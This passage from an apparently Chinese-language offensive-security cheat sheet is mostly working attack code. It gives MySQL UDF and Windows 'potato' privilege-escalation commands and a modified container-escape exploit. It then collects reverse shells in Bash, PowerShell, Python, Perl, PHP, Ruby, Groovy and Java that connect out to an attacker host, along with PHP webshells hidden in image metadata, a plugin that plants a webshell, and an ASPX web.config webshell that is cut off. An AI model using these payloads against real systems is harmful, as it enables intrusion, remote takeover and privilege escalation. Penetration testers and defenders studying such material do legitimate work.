<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/1518">https://www.exploit-db.com/exploits/1518</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -g -c raptor_udf2.c -fPIC<br>gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mysql -u root<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">&gt; use mysql;<br>&gt; create table <span class="hljs-title function_">foo</span><span class="hljs-params">(line blob)</span>;<br>&gt; insert into foo <span class="hljs-title function_">values</span><span class="hljs-params">(load_file(<span class="hljs-string">&#x27;/PATH/TO/SHARED_OBJECT/raptor_udf2.so&#x27;</span>))</span>;<br>&gt; select * from foo into dumpfile <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;</span>;<br>&gt; create function do_system returns integer soname <span class="hljs-string">&#x27;raptor_udf2.so&#x27;</span>;<br>&gt; select <span class="hljs-title function_">do_system</span><span class="hljs-params">(<span class="hljs-string">&#x27;chmod +s /bin/bash&#x27;</span>)</span>;<br></code></pre></td></tr></table></figure>

<h4 id="PrintSpoofer-LPE"><a href="#PrintSpoofer-LPE" class="headerlink" title="PrintSpoofer LPE"></a>PrintSpoofer LPE</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer">https://github.com/itm4n/PrintSpoofer</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\PrintSpoofer64.exe -i -c powershell<br></code></pre></td></tr></table></figure>

<h4 id="SharpEfsPotato-LPE"><a href="#SharpEfsPotato-LPE" class="headerlink" title="SharpEfsPotato LPE"></a>SharpEfsPotato LPE</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/bugch3ck/SharpEfsPotato">https://github.com/bugch3ck/SharpEfsPotato</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1<span class="hljs-number">.0</span>\powershell.exe -a <span class="hljs-string">&quot;C:\nc64.exe -e cmd.exe &lt;LHOST&gt; &lt;LPORT&gt;&quot;</span><br></code></pre></td></tr></table></figure>

<h4 id="令人震惊的集装箱逃生"><a href="#令人震惊的集装箱逃生" class="headerlink" title="令人震惊的集装箱逃生"></a>令人震惊的集装箱逃生</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/gabrtv/shocker/master/shocker.c">https://raw.githubusercontent.com/gabrtv/shocker/master/shocker.c</a></p>
</blockquote>
<h5 id="修改漏洞利用"><a href="#修改漏洞利用" class="headerlink" title="修改漏洞利用"></a>修改漏洞利用</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// get a FS reference from something mounted in from outside</span><br><span class="hljs-keyword">if</span> ((fd1 = open(<span class="hljs-string">&quot;/etc/hostname&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>)<br>        die(<span class="hljs-string">&quot;[-] open&quot;</span>);<br><br><span class="hljs-keyword">if</span> (find_handle(fd1, <span class="hljs-string">&quot;/root/root.txt&quot;</span>, &amp;root_h, &amp;h) &lt;= <span class="hljs-number">0</span>)<br>        die(<span class="hljs-string">&quot;[-] Cannot find valid handle!&quot;</span>);<br></code></pre></td></tr></table></figure>

<h5 id="编译-3"><a href="#编译-3" class="headerlink" title="编译"></a>编译</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc shocker.c -o shocker<br>cc -Wall -<span class="hljs-built_in">std</span>=c99 -O2 shocker.c -<span class="hljs-type">static</span><br></code></pre></td></tr></table></figure>

<h3 id="有效载荷集合汇总"><a href="#有效载荷集合汇总" class="headerlink" title="有效载荷集合汇总"></a>有效载荷集合汇总</h3><h4 id="Exif工具"><a href="#Exif工具" class="headerlink" title="Exif工具"></a>Exif工具</h4><h5 id="PHP-转-JPG-注入"><a href="#PHP-转-JPG-注入" class="headerlink" title="PHP 转 JPG 注入"></a>PHP 转 JPG 注入</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">exiftool -Comment=<span class="hljs-string">&#x27;&lt;?php passthru(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;LHOST&gt; &lt;LPORT&gt; &gt;/tmp/f&quot;); ?&gt;&#x27;</span> shell.jpg<br>exiv2 -c<span class="hljs-number">&#x27;</span>A <span class="hljs-string">&quot;&lt;?php system($_REQUEST[&#x27;cmd&#x27;]);?&gt;&quot;</span>!<span class="hljs-string">&#x27; &lt;FILE&gt;.jpeg</span><br><span class="hljs-string">exiftool &quot;-comment&lt;=back.php&quot; back.png</span><br><span class="hljs-string">exiftool -Comment=&#x27;</span>&lt;?php echo <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>; system($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>]); ?&gt;<span class="hljs-string">&#x27; &lt;FILE&gt;.png</span><br></code></pre></td></tr></table></figure>

<h4 id="反向SHELL"><a href="#反向SHELL" class="headerlink" title="反向SHELL"></a>反向SHELL</h4><h5 id="Bash-反向-Shell"><a href="#Bash-反向-Shell" class="headerlink" title="Bash 反向 Shell"></a>Bash 反向 Shell</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br>bash -c <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&#x27;</span><br>echo -n <span class="hljs-string">&#x27;/bin/bash -c &quot;bin/bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&quot;&#x27;</span> | base64<br></code></pre></td></tr></table></figure>

<h5 id="CURL反向-Shell"><a href="#CURL反向-Shell" class="headerlink" title="CURL反向 Shell"></a>CURL反向 Shell</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">curl --header <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> --request POST http:<span class="hljs-comment">//&lt;RHOST&gt;:&lt;RPORT&gt;/upload --data &#x27;&#123;&quot;auth&quot;: &#123;&quot;name&quot;: &quot;&lt;USERNAME&gt;&quot;, &quot;password&quot;: &quot;&lt;PASSWORD&gt;&quot;&#125;, &quot;filename&quot; : &quot;&amp; echo &quot;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&quot;|base64 -d|bash&quot;&#125;&#x27;</span><br></code></pre></td></tr></table></figure>

<h5 id="Groovy-Jenkins-反向-Shell"><a href="#Groovy-Jenkins-反向-Shell" class="headerlink" title="Groovy (Jenkins) 反向 Shell"></a>Groovy (Jenkins) 反向 Shell</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">String host=<span class="hljs-string">&quot;&lt;LHOST&gt;&quot;</span>;<br><span class="hljs-type">int</span> port=&lt;LPORT&gt;;<br>String cmd=<span class="hljs-string">&quot;/bin/bash&quot;</span>;<br>Process p=new ProcessBuilder(cmd).redirectErrorStream(<span class="hljs-literal">true</span>).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="hljs-keyword">while</span>(!s.isClosed())&#123;<span class="hljs-keyword">while</span>(pi.available()&gt;<span class="hljs-number">0</span>)so.write(pi.read());<span class="hljs-keyword">while</span>(pe.available()&gt;<span class="hljs-number">0</span>)so.write(pe.read());<span class="hljs-keyword">while</span>(si.available()&gt;<span class="hljs-number">0</span>)po.write(si.read());so.flush();po.flush();Thread.sleep(<span class="hljs-number">50</span>);try &#123;p.exitValue();<span class="hljs-keyword">break</span>;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();<br></code></pre></td></tr></table></figure>

<h5 id="JAVA反向Shell"><a href="#JAVA反向Shell" class="headerlink" title="JAVA反向Shell"></a>JAVA反向Shell</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">r = Runtime.getRuntime()<br>p = r.exec([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt;;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])<br>p.waitFor()<br><br>r = Runtime.getRuntime(); p = r.exec([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt;;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[]); p.waitFor();<br></code></pre></td></tr></table></figure>

<h6 id="shell-jar"><a href="#shell-jar" class="headerlink" title="shell.jar"></a>shell.jar</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">package &lt;NAME&gt;;<br><br>import org.bukkit.plugin.java.JavaPlugin;<br><br>import java.io.IOException;<br>import java.nio.file.Files;<br>import java.nio.file.Paths;<br>import java.nio.file.StandardOpenOption;<br><br>public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> <span class="hljs-title">extends</span> <span class="hljs-title">JavaPlugin</span> &#123;</span><br>   @Override<br>   public <span class="hljs-type">void</span> <span class="hljs-title function_">onDisable</span><span class="hljs-params">()</span> &#123;<br>     super.onDisable();<br>   &#125;<br><br>@Override<br>public <span class="hljs-type">void</span> <span class="hljs-title function_">onEnable</span><span class="hljs-params">()</span> &#123;<br>  final String PHP_CODE = <span class="hljs-string">&quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;</span>;<br>  try &#123;<br>   Files.write(Paths.get(<span class="hljs-string">&quot;/var/www/&lt;RHOST&gt;/shell.php&quot;</span>), PHP_CODE.getBytes(), StandardOpenOption.CREATE_NEW);<br>   &#125; catch (IOException e) &#123;<br>     e.printStackTrace();<br>   &#125;<br><br>   super.onEnable();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="Lua-反向-Shell"><a href="#Lua-反向-Shell" class="headerlink" title="Lua 反向 Shell"></a>Lua 反向 Shell</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">http:<span class="hljs-comment">//&lt;RHOST&gt;&#x27;);os.execute(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;LHOST&gt; &lt;LPORT&gt;/tmp/f&quot;)--</span><br></code></pre></td></tr></table></figure>

<h5 id="Markdown-反向-Shell"><a href="#Markdown-反向-Shell" class="headerlink" title="Markdown 反向 Shell"></a>Markdown 反向 Shell</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">--<span class="hljs-string">&#x27;;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1;&#x27;</span>--<br></code></pre></td></tr></table></figure>

<h5 id="mkfifo-反向-Shell"><a href="#mkfifo-反向-Shell" class="headerlink" title="mkfifo 反向 Shell"></a>mkfifo 反向 Shell</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mkfifo /tmp/shell; nc &lt;LHOST&gt; &lt;LPORT&gt; <span class="hljs-number">0</span>&lt;/tmp/shell | /bin/sh &gt;/tmp/shell <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>; rm /tmp/shell<br></code></pre></td></tr></table></figure>

<h5 id="Netcat-反向-Shell"><a href="#Netcat-反向-Shell" class="headerlink" title="Netcat 反向 Shell"></a>Netcat 反向 Shell</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nc -e /bin/sh &lt;LHOST&gt; &lt;LPORT&gt;<br></code></pre></td></tr></table></figure>

<h5 id="Perl-反向-Shell"><a href="#Perl-反向-Shell" class="headerlink" title="Perl 反向 Shell"></a>Perl 反向 Shell</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;&lt;LHOST&gt;&quot;;$p=&lt;LPORT&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></code></pre></td></tr></table></figure>

<h5 id="PHP-反向-Shell"><a href="#PHP-反向-Shell" class="headerlink" title="PHP 反向 Shell"></a>PHP 反向 Shell</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;&lt;LHOST&gt;&quot;,&lt;LPORT&gt;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></code></pre></td></tr></table></figure>

<h5 id="PowerShell-反向-Shell"><a href="#PowerShell-反向-Shell" class="headerlink" title="PowerShell 反向 Shell"></a>PowerShell 反向 Shell</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">$client = New-Object System.Net.Sockets.TCPClient(<span class="hljs-string">&#x27;&lt;LHOST&gt;&#x27;</span>,&lt;LPORT&gt;);$stream = $client.GetStream();[byte[]]$bytes = <span class="hljs-number">0.</span><span class="hljs-number">.65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>(($i = $stream.Read($bytes, <span class="hljs-number">0</span>, $bytes.Length)) -ne <span class="hljs-number">0</span>)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,<span class="hljs-number">0</span>, $i);$sendback = (iex <span class="hljs-string">&quot;. &#123; $data &#125; 2&gt;&amp;1&quot;</span> | Out-String ); $sendback2 = $sendback + <span class="hljs-string">&#x27;PS &#x27;</span> + (pwd).Path + <span class="hljs-string">&#x27;&gt; &#x27;</span>;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,<span class="hljs-number">0</span>,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">powershell -nop -c <span class="hljs-string">&quot;$client = New-Object System.Net.Sockets.TCPClient(&#x27;&lt;LHOST&gt;&#x27;,&lt;LPORT&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">powershell -nop -exec bypass -c <span class="hljs-string">&#x27;$client = New-Object System.Net.Sockets.TCPClient(&quot;&lt;LHOST&gt;&quot;,&lt;LPORT&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&#x27;</span><br></code></pre></td></tr></table></figure>

<h5 id="minireverse-ps1"><a href="#minireverse-ps1" class="headerlink" title="minireverse.ps1"></a>minireverse.ps1</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c">$socket = new-object System.Net.Sockets.TcpClient(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">413</span>);<br><span class="hljs-keyword">if</span>($socket -eq $null)&#123;<span class="hljs-built_in">exit</span> <span class="hljs-number">1</span>&#125;<br>$stream = $socket.GetStream();<br>$writer = new-object System.IO.StreamWriter($stream);<br>$buffer = new-object System.Byte[] <span class="hljs-number">1024</span>;<br>$encoding = new-object System.Text.AsciiEncoding;<br><span class="hljs-keyword">do</span><br>&#123;<br>    $writer.Flush();<br>    $read = $null;<br>    $res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span>($stream.DataAvailable -or $read -eq $null) &#123;<br>        $read = $stream.Read($buffer, <span class="hljs-number">0</span>, <span class="hljs-number">1024</span>)<br>    &#125;<br>    $out = $encoding.GetString($buffer, <span class="hljs-number">0</span>, $read).Replace(<span class="hljs-string">&quot;`r`n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).Replace(<span class="hljs-string">&quot;`n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!$out.equals(<span class="hljs-string">&quot;exit&quot;</span>))&#123;<br>        $args = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>($out.IndexOf(<span class="hljs-string">&#x27; &#x27;</span>) -gt <span class="hljs-number">-1</span>)&#123;<br>            $args = $out.substring($out.IndexOf(<span class="hljs-string">&#x27; &#x27;</span>)+<span class="hljs-number">1</span>);<br>            $out = $out.substring(<span class="hljs-number">0</span>,$out.IndexOf(<span class="hljs-string">&#x27; &#x27;</span>));<br>            <span class="hljs-keyword">if</span>($args.split(<span class="hljs-string">&#x27; &#x27;</span>).length -gt <span class="hljs-number">1</span>)&#123;<br>                $pinfo = New-Object System.Diagnostics.ProcessStartInfo<br>                $pinfo.FileName = <span class="hljs-string">&quot;cmd.exe&quot;</span><br>                $pinfo.RedirectStandardError = $<span class="hljs-literal">true</span><br>                $pinfo.RedirectStandardOutput = $<span class="hljs-literal">true</span><br>                $pinfo.UseShellExecute = $<span class="hljs-literal">false</span><br>                $pinfo.Arguments = <span class="hljs-string">&quot;/c $out $args&quot;</span><br>                $p = New-Object System.Diagnostics.Process<br>                $p.StartInfo = $pinfo<br>                $p.Start() | Out-Null<br>                $p.WaitForExit()<br>                $<span class="hljs-built_in">stdout</span> = $p.StandardOutput.ReadToEnd()<br>                $<span class="hljs-built_in">stderr</span> = $p.StandardError.ReadToEnd()<br>                <span class="hljs-keyword">if</span> ($p.ExitCode -ne <span class="hljs-number">0</span>) &#123;<br>                    $res = $<span class="hljs-built_in">stderr</span><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    $res = $<span class="hljs-built_in">stdout</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                $res = (&amp;<span class="hljs-string">&quot;$out&quot;</span> <span class="hljs-string">&quot;$args&quot;</span>) | out-<span class="hljs-built_in">string</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            $res = (&amp;<span class="hljs-string">&quot;$out&quot;</span>) | out-<span class="hljs-built_in">string</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>($res -ne $null)&#123;<br>        $writer.WriteLine($res)<br>    &#125;<br>    &#125;<br>&#125;While (!$out.equals(<span class="hljs-string">&quot;exit&quot;</span>))<br>$writer.close();<br>$socket.close();<br>$stream.Dispose()<br></code></pre></td></tr></table></figure>

<h5 id="Python-反向-Shell"><a href="#Python-反向-Shell" class="headerlink" title="Python 反向 Shell"></a>Python 反向 Shell</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;LHOST&gt;&quot;,&lt;LPORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">python3 -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;LHOST&gt;&quot;,&lt;LPORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">python -c <span class="hljs-string">&#x27;import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen([&quot;/bin/su&quot;,&quot;-c&quot;,&quot;id&quot;,&quot;bynarr&quot;],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,&quot;fruity\n&quot;);time.sleep(0.1);print os.read(master,1024);&#x27;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">echo python3 -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;LHOST&gt;&quot;,&lt;LPORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span> &gt; &lt;FILE&gt;&lt;(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);<span class="hljs-string">&#x27; &gt; &lt;FILE&gt;</span><br></code></pre></td></tr></table></figure>

<h5 id="Ruby-反向-Shell"><a href="#Ruby-反向-Shell" class="headerlink" title="Ruby 反向 Shell"></a>Ruby 反向 Shell</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ruby -rsocket -e<span class="hljs-number">&#x27;f</span>=TCPSocket.open(<span class="hljs-string">&quot;&lt;LHOST&gt;&quot;</span>,&lt;LPORT&gt;).to_i;exec <span class="hljs-title function_">sprintf</span><span class="hljs-params">(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;</span>,f,f,f)</span>&#x27;<br></code></pre></td></tr></table></figure>

<h4 id="WEBSHELL"><a href="#WEBSHELL" class="headerlink" title="WEBSHELL"></a>WEBSHELL</h4><h5 id="PHP-WEBSHELL"><a href="#PHP-WEBSHELL" class="headerlink" title="PHP WEBSHELL"></a>PHP WEBSHELL</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php <span class="hljs-title function_">system</span><span class="hljs-params">($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>])</span>; ?&gt;<br>&lt;?php echo <span class="hljs-title function_">exec</span><span class="hljs-params">($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>])</span>; ?&gt;<br>&lt;?php echo <span class="hljs-title function_">passthru</span><span class="hljs-params">($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>])</span>; ?&gt;<br>&lt;?php <span class="hljs-title function_">passthru</span><span class="hljs-params">($_REQUEST[<span class="hljs-string">&#x27;cmd&#x27;</span>])</span>; ?&gt;<br>&lt;?php echo <span class="hljs-title function_">system</span><span class="hljs-params">($_REQUEST[<span class="hljs-string">&#x27;shell&#x27;</span>])</span>: ?&gt;<br></code></pre></td></tr></table></figure>

<h3 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h3><h4 id="ASPX-WEBSHELL"><a href="#ASPX-WEBSHELL" class="headerlink" title="ASPX WEBSHELL"></a>ASPX WEBSHELL</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;configuration&gt;<br>   &lt;system.webServer&gt;<br>      &lt;handlers accessPolicy=<span class="hljs-string">&quot;Read, Script, Write&quot;</span>&gt;<br>         &lt;add name=<span class="hljs-string">&quot;web_config&quot;</span> path=<span class="hljs-string">&quot;*.config&quot;</span> verb=<span class="hljs-string">&quot;*&quot;</span> modules=<span class="hljs-string">&quot;IsapiModule&quot;</span> scriptProcessor=<span class="hljs-string">&quot;%windir%\system32\inetsrv\asp.dll&quot;</span> resourceType=<span class="hljs-string">&quot;Unspecified&quot;</span> requireAccess=<span class="hljs-string">&quot;Write&quot;</span> preCondition=<span 